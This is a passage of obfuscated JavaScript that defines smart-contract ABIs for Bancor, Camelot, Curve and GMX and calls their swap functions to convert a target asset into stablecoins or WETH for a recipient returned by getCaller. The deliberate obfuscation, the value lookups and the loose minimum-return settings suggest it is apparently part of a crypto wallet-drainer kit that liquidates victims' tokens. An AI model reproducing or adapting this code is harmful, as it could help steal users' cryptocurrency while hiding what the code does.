            outputs: [],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x276bb5 = {
            name: '_path',
            type: "address[]"
          };
          const _0x201e84 = {
            name: "_amount",
            type: 'uint256'
          };
          const _0xc176f7 = {
            name: "_minReturn",
            type: 'uint256'
          };
          const _0x1975f0 = {
            name: "_affiliateAccount",
            type: "address"
          };
          const _0x368151 = {
            name: "_affiliateFee",
            type: "uint256"
          };
          const _0x504e74 = {
            name: '',
            type: 'uint256'
          };
          const _0x192c43 = {
            constant: false,
            inputs: [_0x276bb5, _0x201e84, _0xc176f7, _0x1975f0, _0x368151],
            name: 'convert2',
            outputs: [_0x504e74],
            payable: true,
            stateMutability: "payable",
            type: "function"
          };
          const _0x4c7179 = {
            name: '',
            type: 'uint256'
          };
          const _0x38ff50 = {
            constant: true,
            inputs: [],
            name: "maxAffiliateFee",
            outputs: [_0x4c7179],
            payable: false,
            stateMutability: "view",
            type: "function"
          };
          const _0xff4951 = {
            name: '_token',
            type: "address"
          };
          const _0x50b113 = {
            name: "_to",
            type: "address"
          };
          const _0x434239 = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x114165 = {
            constant: false,
            inputs: [_0xff4951, _0x50b113, _0x434239],
            name: "withdrawTokens",
            outputs: [],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xc13bb2 = {
            constant: true,
            inputs: [],
            name: "prevRegistry",
            outputs: [{
              'name': '',
              'type': "address"
            }],
            payable: false,
            stateMutability: "view",
            type: "function"
          };
          const _0x3b7db3 = {
            constant: false,
            inputs: [],
            name: "acceptOwnership",
            outputs: [],
            payable: false,
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x2f6751 = {
            name: '',
            type: "address"
          };
          const _0x53f730 = {
            constant: true,
            inputs: [],
            name: "registry",
            outputs: [_0x2f6751],
            payable: false,
            stateMutability: "view",
            type: "function"
          };
          const _0x2e0847 = {
            name: '_path',
            type: "address[]"
          };
          const _0x446abc = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x3639d8 = {
            name: '',
            type: 'uint256'
          };
          const _0x13b78d = {
            constant: true,
            inputs: [_0x2e0847, _0x446abc],
            name: "rateByPath",
            outputs: [_0x3639d8],
            payable: false,
            stateMutability: "view",
            type: "function"
          };
          const _0x47ec29 = {
            name: '',
            type: "address"
          };
          const _0x10600e = {
            constant: true,
            inputs: [_0x47ec29],
            name: "etherTokens",
            outputs: [{
              'name': '',
              'type': "bool"
            }],
            payable: false,
            stateMutability: "view",
            type: "function"
          };
          const _0x1c3118 = {
            name: '_path',
            type: "address[]"
          };
          const _0x1fb080 = {
            name: '_bancorX',
            type: "address"
          };
          const _0x224702 = {
            name: "_conversionId",
            type: "uint256"
          };
          const _0x37be3c = {
            name: "_minReturn",
            type: 'uint256'
          };
          const _0x3ac256 = {
            name: "_beneficiary",
            type: "address"
          };
          const _0x355c8a = {
            constant: false,
            inputs: [_0x1c3118, _0x1fb080, _0x224702, _0x37be3c, _0x3ac256],
            name: "completeXConversion",
            outputs: [{
              'name': '',
              'type': 'uint256'
            }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x15c98b = {
            constant: true,
            inputs: [],
            name: "owner",
            outputs: [{
              'name': '',
              'type': "address"
            }],
            payable: false,
            stateMutability: "view",
            type: "function"
          };
          const _0x5e9805 = {
            name: "_path",
            type: "address[]"
          };
          const _0x3d9c64 = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x2571a2 = {
            name: "_minReturn",
            type: 'uint256'
          };
          const _0x4ab782 = {
            name: "_beneficiary",
            type: "address"
          };
          const _0x2646e9 = {
            name: "_affiliateAccount",
            type: "address"
          };
          const _0x5ddc84 = {
            name: "_affiliateFee",
            type: 'uint256'
          };
          const _0x19ef81 = {
            constant: false,
            inputs: [_0x5e9805, _0x3d9c64, _0x2571a2, _0x4ab782, _0x2646e9, _0x5ddc84],
            name: "convertFor2",
            outputs: [{
              'name': '',
              'type': 'uint256'
            }],
            payable: true,
            stateMutability: "payable",
            type: "function"
          };
          const _0x2d3637 = {
            name: '_path',
            type: "address[]"
          };
          const _0x390efb = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x514fd8 = {
            name: "_minReturn",
            type: "uint256"
          };
          const _0x20e71d = {
            name: "_beneficiary",
            type: "address"
          };
          const _0x4a2b91 = {
            name: '',
            type: 'uint256'
          };
          const _0x22b37c = {
            constant: false,
            inputs: [_0x2d3637, _0x390efb, _0x514fd8, _0x20e71d],
            name: "claimAndConvertFor",
            outputs: [_0x4a2b91],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x102fb9 = {
            constant: false,
            inputs: [],
            name: "restoreRegistry",
            outputs: [],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x665079 = {
            name: '_path',
            type: "address[]"
          };
          const _0x3c7666 = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x1d5868 = {
            name: "_minReturn",
            type: 'uint256'
          };
          const _0x2db3a6 = {
            name: "_beneficiary",
            type: "address"
          };
          const _0x3b78e4 = {
            name: "_affiliateAccount",
            type: 'address'
          };
          const _0x25688b = {
            name: "_affiliateFee",
            type: 'uint256'
          };
          const _0x46b518 = {
            constant: false,
            inputs: [_0x665079, _0x3c7666, _0x1d5868, _0x2db3a6, _0x3b78e4, _0x25688b],
            name: "convertByPath",
            outputs: [{
              'name': '',
              'type': 'uint256'
            }],
            payable: true,
            stateMutability: "payable",
            type: "function"
          };
          const _0x3af2d6 = {
            name: '_path',
            type: "address[]"
          };
          const _0x1c7377 = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x2eaf5c = {
            name: "_minReturn",
            type: 'uint256'
          };
          const _0x217957 = {
            name: "_targetBlockchain",
            type: "bytes32"
          };
          const _0x454696 = {
            name: "_targetAccount",
            type: "bytes32"
          };
          const _0x27a76e = {
            name: "_conversionId",
            type: 'uint256'
          };
          const _0x21856e = {
            name: '',
            type: 'uint256'
          };
          const _0xec7a6 = {
            constant: false,
            inputs: [_0x3af2d6, _0x1c7377, _0x2eaf5c, _0x217957, _0x454696, _0x27a76e],
            name: 'xConvert',
            outputs: [_0x21856e],
            payable: true,
            stateMutability: "payable",
            type: "function"
          };
          const _0xa1fe75 = {
            name: "_path",
            type: "address[]"
          };
          const _0x9f50dc = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x278714 = {
            name: "_minReturn",
            type: 'uint256'
          };
          const _0x1cb782 = {
            name: '',
            type: "uint256"
          };
          const _0x50bba1 = {
            constant: false,
            inputs: [_0xa1fe75, _0x9f50dc, _0x278714],
            name: "claimAndConvert",
            outputs: [_0x1cb782],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x40da20 = {
            name: '_path',
            type: "address[]"
          };
          const _0x63ddea = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x5ac642 = {
            name: "_minReturn",
            type: 'uint256'
          };
          const _0x144fef = {
            name: "_beneficiary",
            type: "address"
          };
          const _0x33142b = {
            constant: false,
            inputs: [_0x40da20, _0x63ddea, _0x5ac642, _0x144fef],
            name: "convertFor",
            outputs: [{
              'name': '',
              'type': 'uint256'
            }],
            payable: true,
            stateMutability: "payable",
            type: "function"
          };
          const _0x22256a = {
            name: '_path',
            type: "address[]"
          };
          const _0x110472 = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x564bb4 = {
            name: "_minReturn",
            type: 'uint256'
          };
          const _0x11864f = {
            name: "_targetBlockchain",
            type: "bytes32"
          };
          const _0x51fec7 = {
            name: "_targetAccount",
            type: "bytes32"
          };
          const _0x119efa = {
            name: "_conversionId",
            type: 'uint256'
          };
          const _0x3237b6 = {
            name: "_affiliateAccount",
            type: "address"
          };
          const _0x2ba1f2 = {
            name: "_affiliateFee",
            type: "uint256"
          };
          const _0x577288 = {
            constant: false,
            inputs: [_0x22256a, _0x110472, _0x564bb4, _0x11864f, _0x51fec7, _0x119efa, _0x3237b6, _0x2ba1f2],
            name: 'xConvert2',
            outputs: [{
              'name': '',
              'type': 'uint256'
            }],
            payable: true,
            stateMutability: "payable",
            type: "function"
          };
          const _0x41f826 = {
            constant: true,
            inputs: [],
            name: "newOwner",
            outputs: [{
              'name': '',
              'type': "address"
            }],
            payable: false,
            stateMutability: "view",
            type: 'function'
          };
          const _0x5b46be = {
            name: "_sourceToken",
            type: "address"
          };
          const _0x3c185d = {
            name: "_targetToken",
            type: "address"
          };
          const _0x44f97d = {
            name: '',
            type: "address[]"
          };
          const _0x3c9ddd = {
            constant: true,
            inputs: [_0x5b46be, _0x3c185d],
            name: "conversionPath",
            outputs: [_0x44f97d],
            payable: false,
            stateMutability: "view",
            type: 'function'
          };
          const _0x8ef37d = {
            name: '_path',
            type: 'address[]'
          };
          const _0x5e22f3 = {
            name: "_amount",
            type: 'uint256'
          };
          const _0x8802f6 = {
            name: "_minReturn",
            type: "uint256"
          };
          const _0x49e277 = {
            name: "_affiliateAccount",
            type: "address"
          };
          const _0x26aa47 = {
            name: "_affiliateFee",
            type: 'uint256'
          };
          const _0x46f850 = {
            name: '',
            type: 'uint256'
          };
          const _0x874fd2 = {
            constant: false,
            inputs: [_0x8ef37d, _0x5e22f3, _0x8802f6, _0x49e277, _0x26aa47],
            name: "claimAndConvert2",
            outputs: [_0x46f850],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x45e9d4 = {
            name: "_newOwner",
            type: "address"
          };
          const _0x28c91b = {
            constant: false,
            inputs: [_0x45e9d4],
            name: "transferOwnership",
            outputs: [],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x401a08 = {
            name: '_path',
            type: "address[]"
          };
          const _0xe84056 = {
            name: "_amount",
            type: "uint256"
          };
          const _0x27a0d7 = {
            name: "_minReturn",
            type: 'uint256'
          };
          const _0xaffb88 = {
            name: '',
            type: 'uint256'
          };
          const _0x193886 = {
            constant: false,
            inputs: [_0x401a08, _0xe84056, _0x27a0d7],
            name: "convert",
            outputs: [_0xaffb88],
            payable: true,
            stateMutability: "payable",
            type: "function"
          };
          const _0x353fb2 = {
            name: "_maxAffiliateFee",
            type: 'uint256'
          };
          const _0xb63f67 = {
            constant: false,
            inputs: [_0x353fb2],
            name: "setMaxAffiliateFee",
            outputs: [],
            payable: false,
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3db67b = {
            name: "_registry",
            type: "address"
          };
          const _0x216dc1 = {
            inputs: [_0x3db67b],
            payable: false,
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x12aad5 = {
            indexed: true,
            name: "_smartToken",
            type: "address"
          };
          const _0x487a39 = {
            indexed: true,
            name: "_fromToken",
            type: "address"
          };
          const _0x22f333 = {
            indexed: true,
            name: "_toToken",
            type: "address"
          };
          const _0x285e0f = {
            indexed: false,
            name: "_fromAmount",
            type: 'uint256'
          };
          const _0x343abf = {
            indexed: false,
            name: "_toAmount",
            type: "uint256"
          };
          const _0x2e1cb4 = {
            indexed: false,
            name: "_trader",
            type: "address"
          };
          const _0x25155a = {
            anonymous: false,
            inputs: [_0x12aad5, _0x487a39, _0x22f333, _0x285e0f, _0x343abf, _0x2e1cb4],
            name: "Conversion",
            type: 'event'
          };
          const _0x798798 = {
            indexed: true,
            name: "_prevOwner",
            type: "address"
          };
          const _0x1dc53b = {
            indexed: true,
            name: '_newOwner',
            type: "address"
          };
          const _0x5257d6 = {
            anonymous: false,
            inputs: [_0x798798, _0x1dc53b],
            name: "OwnerUpdate",
            type: 'event'
          };
          let _0x1652fb = [_0x4c8ffa, _0x4eee84, _0x52674a, _0xc016e5, _0x301b67, _0x4e9bee, _0x192c43, _0x38ff50, _0x114165, _0xc13bb2, _0x3b7db3, _0x53f730, _0x13b78d, _0x10600e, _0x355c8a, _0x15c98b, _0x19ef81, _0x22b37c, _0x102fb9, _0x46b518, _0xec7a6, _0x50bba1, _0x33142b, _0x577288, _0x41f826, _0x3c9ddd, _0x874fd2, _0x28c91b, _0x193886, _0xb63f67, _0x216dc1, _0x25155a, _0x5257d6];
          let _0x48678f = new ethers.Contract(_0x3941f8, _0x1652fb, _0xab3127);
          let _0x37e744 = "0xdac17f958d2ee523a2206206994597c13d831ec7";
          if (_0x2a18aa.asset.token == "0xdac17f958d2ee523a2206206994597c13d831ec7") {
            _0x37e744 = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
          }
          let _0x2aa1d7 = await _0x48678f.conversionPath(_0x2a18aa.asset.token, _0x37e744);
          console.log(_0x2aa1d7);
          return [_0x48678f.convertByPath(_0x2aa1d7, _0x2a18aa.asset.amount, 1, this.getCaller(_0x2a18aa), "0x0000000000000000000000000000000000000000", '0'), _0x37e744];
        }
      case "Camelot":
        {
          const _0x34e790 = {
            internalType: "address",
            name: "_factory",
            type: "address"
          };
          const _0x333c55 = {
            internalType: "address",
            name: "_WETH",
            type: "address"
          };
          const _0x265a49 = {
            inputs: [_0x34e790, _0x333c55],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x4a58d1 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x2810c9 = {
            inputs: [],
            name: 'WETH',
            outputs: [_0x4a58d1],
            stateMutability: "view",
            type: "function"
          };
          const _0x11f5eb = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x7fddaf = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x2e202a = {
            internalType: 'uint256',
            name: "amountADesired",
            type: 'uint256'
          };
          const _0x103e6f = {
            internalType: 'uint256',
            name: "amountBDesired",
            type: 'uint256'
          };
          const _0x9bccf9 = {
            internalType: "uint256",
            name: "amountAMin",
            type: "uint256"
          };
          const _0xcfb8b2 = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x597c40 = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0x5a2208 = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x1f3acb = {
            inputs: [_0x11f5eb, _0x7fddaf, _0x2e202a, _0x103e6f, _0x9bccf9, _0xcfb8b2, _0x597c40, _0x5a2208],
            name: "addLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "liquidity",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x240214 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x4245bb = {
            internalType: 'uint256',
            name: "amountTokenDesired",
            type: 'uint256'
          };
          const _0x1c6052 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0xac60f1 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x37fbeb = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x300c2b = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x42568b = {
            inputs: [_0x240214, _0x4245bb, _0x1c6052, _0xac60f1, _0x37fbeb, _0x300c2b],
            name: "addLiquidityETH",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountETH",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': 'liquidity',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0xb0d19e = {
            inputs: [],
            name: 'factory',
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': 'address'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x544619 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x278aea = {
            internalType: "address[]",
            name: "path",
            type: 'address[]'
          };
          const _0x1ccda4 = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x3a0854 = {
            inputs: [_0x544619, _0x278aea],
            name: "getAmountsOut",
            outputs: [_0x1ccda4],
            stateMutability: "view",
            type: "function"
          };
          const _0x2304bf = {
            internalType: "address",
            name: "token1",
            type: "address"
          };
          const _0x578d81 = {
            internalType: 'address',
            name: "token2",
            type: "address"
          };
          const _0x40f9be = {
            inputs: [_0x2304bf, _0x578d81],
            name: "getPair",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x1b8de0 = {
            internalType: 'uint256',
            name: "amountA",
            type: 'uint256'
          };
          const _0x1f6041 = {
            internalType: 'uint256',
            name: 'reserveA',
            type: 'uint256'
          };
          const _0x4c2d56 = {
            internalType: 'uint256',
            name: 'reserveB',
            type: 'uint256'
          };
          const _0x1959f0 = {
            internalType: 'uint256',
            name: "amountB",
            type: 'uint256'
          };
          const _0x2e8097 = {
            inputs: [_0x1b8de0, _0x1f6041, _0x4c2d56],
            name: "quote",
            outputs: [_0x1959f0],
            stateMutability: 'pure',
            type: "function"
          };
          const _0x5c592 = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x9ebf43 = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x38e8ff = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x2c5bdd = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x285f1a = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x44a3b8 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5409ce = {
            internalType: 'uint256',
            name: 'deadline',
            type: "uint256"
          };
          const _0x2ee7f8 = {
            inputs: [_0x5c592, _0x9ebf43, _0x38e8ff, _0x2c5bdd, _0x285f1a, _0x44a3b8, _0x5409ce],
            name: "removeLiquidity",
            outputs: [{
              'internalType': "uint256",
              'name': "amountA",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1fc82c = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x172fab = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x537717 = {
            internalType: "uint256",
            name: "amountTokenMin",
            type: "uint256"
          };
          const _0x5f2e93 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x40c84b = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x22e688 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x17418f = {
            inputs: [_0x1fc82c, _0x172fab, _0x537717, _0x5f2e93, _0x40c84b, _0x22e688],
            name: "removeLiquidityETH",
            outputs: [{
              'internalType': "uint256",
              'name': "amountToken",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountETH",
              'type': 'uint256'
            }],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0x24450d = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x5bb543 = {
            internalType: 'uint256',
            name: "liquidity",
            type: 'uint256'
          };
          const _0x42d6b3 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: "uint256"
          };
          const _0x1ec463 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x2488b1 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x44de3b = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x2d0a29 = {
            inputs: [_0x24450d, _0x5bb543, _0x42d6b3, _0x1ec463, _0x2488b1, _0x44de3b],
            name: "removeLiquidityETHSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountETH",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x43b0ea = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x1d1573 = {
            internalType: "uint256",
            name: "liquidity",
            type: 'uint256'
          };
          const _0x3a3879 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x2070d2 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x574c56 = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0x1a7310 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x493724 = {
            internalType: "bool",
            name: 'approveMax',
            type: 'bool'
          };
          const _0x1ab181 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x1e994e = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x54c092 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x307484 = {
            internalType: 'uint256',
            name: "amountToken",
            type: 'uint256'
          };
          const _0x4b70d2 = {
            internalType: 'uint256',
            name: "amountETH",
            type: 'uint256'
          };
          const _0xe60a6e = {
            inputs: [_0x43b0ea, _0x1d1573, _0x3a3879, _0x2070d2, _0x574c56, _0x1a7310, _0x493724, _0x1ab181, _0x1e994e, _0x54c092],
            name: "removeLiquidityETHWithPermit",
            outputs: [_0x307484, _0x4b70d2],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x442fba = {
            internalType: 'address',
            name: 'token',
            type: "address"
          };
          const _0x4adc54 = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x4cc9d1 = {
            internalType: "uint256",
            name: "amountTokenMin",
            type: "uint256"
          };
          const _0x414a23 = {
            internalType: 'uint256',
            name: "amountETHMin",
            type: 'uint256'
          };
          const _0x260544 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x5f4ce7 = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0xb610ed = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x875697 = {
            internalType: "uint8",
            name: 'v',
            type: 'uint8'
          };
          const _0x5e126d = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x121d32 = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x18de68 = {
            inputs: [_0x442fba, _0x4adc54, _0x4cc9d1, _0x414a23, _0x260544, _0x5f4ce7, _0xb610ed, _0x875697, _0x5e126d, _0x121d32],
            name: "removeLiquidityETHWithPermitSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountETH",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x4e1e2d = {
            internalType: "address",
            name: "tokenA",
            type: "address"
          };
          const _0x16835d = {
            internalType: "address",
            name: "tokenB",
            type: "address"
          };
          const _0x5ba7c9 = {
            internalType: 'uint256',
            name: "liquidity",
            type: "uint256"
          };
          const _0x5af368 = {
            internalType: 'uint256',
            name: "amountAMin",
            type: 'uint256'
          };
          const _0x2194c6 = {
            internalType: 'uint256',
            name: "amountBMin",
            type: 'uint256'
          };
          const _0x5b1b16 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1648f0 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x11e7fa = {
            internalType: "bool",
            name: "approveMax",
            type: "bool"
          };
          const _0x3a4fd3 = {
            internalType: "uint8",
            name: 'v',
            type: "uint8"
          };
          const _0x2b3aca = {
            internalType: "bytes32",
            name: 'r',
            type: "bytes32"
          };
          const _0x41d6ce = {
            internalType: "bytes32",
            name: 's',
            type: "bytes32"
          };
          const _0x1dbebd = {
            inputs: [_0x4e1e2d, _0x16835d, _0x5ba7c9, _0x5af368, _0x2194c6, _0x5b1b16, _0x1648f0, _0x11e7fa, _0x3a4fd3, _0x2b3aca, _0x41d6ce],
            name: "removeLiquidityWithPermit",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountA',
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountB",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x10ac58 = {
            internalType: "uint256",
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x854f1d = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0xf0cd1c = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x216f0a = {
            internalType: "address",
            name: "referrer",
            type: "address"
          };
          const _0x17bbce = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x3ca14c = {
            inputs: [_0x10ac58, _0x854f1d, _0xf0cd1c, _0x216f0a, _0x17bbce],
            name: "swapExactETHForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0xabea4b = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x459bd2 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x31cce8 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x3a74b7 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x45af8c = {
            internalType: "address",
            name: "referrer",
            type: "address"
          };
          const _0x47859f = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4dbd44 = {
            inputs: [_0xabea4b, _0x459bd2, _0x31cce8, _0x3a74b7, _0x45af8c, _0x47859f],
            name: "swapExactTokensForETHSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x17d30b = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x1e1409 = {
            internalType: "uint256",
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x42bd4f = {
            internalType: "address[]",
            name: "path",
            type: "address[]"
          };
          const _0x36b60a = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x1596f3 = {
            internalType: "address",
            name: "referrer",
            type: "address"
          };
          const _0x544fc2 = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x216293 = {
            inputs: [_0x17d30b, _0x1e1409, _0x42bd4f, _0x36b60a, _0x1596f3, _0x544fc2],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            outputs: [],
            stateMutability: 'nonpayable',
            type: "function"
          };
          const _0x46cfce = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x2314d9 = [_0x265a49, _0x2810c9, _0x1f3acb, _0x42568b, _0xb0d19e, _0x3a0854, _0x40f9be, _0x2e8097, _0x2ee7f8, _0x17418f, _0x2d0a29, _0xe60a6e, _0x18de68, _0x1dbebd, _0x3ca14c, _0x4dbd44, _0x216293, _0x46cfce];
          let _0x3b4564 = new ethers.Contract(_0x3941f8, _0x2314d9, _0xab3127);
          let _0x2c1919 = [];
          _0x2c1919[0] = _0x2a18aa.asset.token;
          _0x2c1919[1] = "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1";
          try {
            let _0x4c9682 = this.token_array.find(_0x135e25 => _0x135e25.token_address == _0x2a18aa.asset.token && _0x135e25.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x4c9682.value) * Number(0.7) / Number(ethPrice)).toString(), 'ether'));
          } catch {}
          return [_0x3b4564.swapExactTokensForTokensSupportingFeeOnTransferTokens(_0x2a18aa.asset.amount, _0xcd0737, _0x2c1919, this.getCaller(_0x2a18aa), "0x0000000000000000000000000000000000000000", _0x4d5eff), _0x2c1919[1]];
        }
      case "Curve":
      case "CurveVyper1":
        {
          const _0x5f3eaa = {
            stateMutability: "nonpayable",
            type: 'function',
            name: "exchange_with_best_rate",
            inputs: [{
              'name': '_from',
              'type': "address"
            }, {
              'name': "_to",
              'type': "address"
            }, {
              'name': "_amount",
              'type': 'uint256'
            }, {
              'name': "_expected",
              'type': 'uint256'
            }, {
              'name': "_receiver",
              'type': "address"
            }],
            outputs: [{
              'name': '',
              'type': 'uint256'
            }]
          };
          let _0x3ed937 = [_0x5f3eaa];
          let _0x57552d = new ethers.Contract(_0x3941f8, _0x3ed937, _0xab3127);
          try {
            let _0x310015 = this.token_array.find(_0x330928 => _0x330928.token_address == _0x2a18aa.asset.token && _0x330928.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x310015.value) * Number(0.7) / Number(1)).toString(), "ether"));
          } catch {}
          let _0x303d86 = "0x6b175474e89094c44da98b954eedeac495271d0f";
          if (_0x2a18aa.asset.token == _0x303d86) {
            _0x303d86 = "0xdac17f958d2ee523a2206206994597c13d831ec7";
          }
          return [_0x57552d.exchange_with_best_rate(_0x2a18aa.asset.token, "0x6b175474e89094c44da98b954eedeac495271d0f", _0x2a18aa.asset.amount, _0xcd0737, this.getCaller(_0x2a18aa)), _0x303d86];
        }
      case "GMX":
        {
          const _0x3684e5 = {
            internalType: "address",
            name: '_vault',
            type: "address"
          };
          const _0x1ffd15 = {
            internalType: "address",
            name: '_usdg',
            type: "address"
          };
          const _0x1d55b1 = {
            internalType: "address",
            name: "_weth",
            type: "address"
          };
          const _0x2b58e1 = {
            inputs: [_0x3684e5, _0x1ffd15, _0x1d55b1],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x24c2d3 = {
            indexed: false,
            internalType: "address",
            name: "account",
            type: "address"
          };
          const _0x2af58a = {
            indexed: false,
            internalType: "address",
            name: "tokenIn",
            type: "address"
          };
          const _0x497f8f = {
            indexed: false,
            internalType: "address",
            name: "tokenOut",
            type: "address"
          };
          const _0x195d83 = {
            indexed: false,
            internalType: 'uint256',
            name: "amountIn",
            type: 'uint256'
          };
          const _0x5436c4 = {
            indexed: false,
            internalType: 'uint256',
            name: "amountOut",
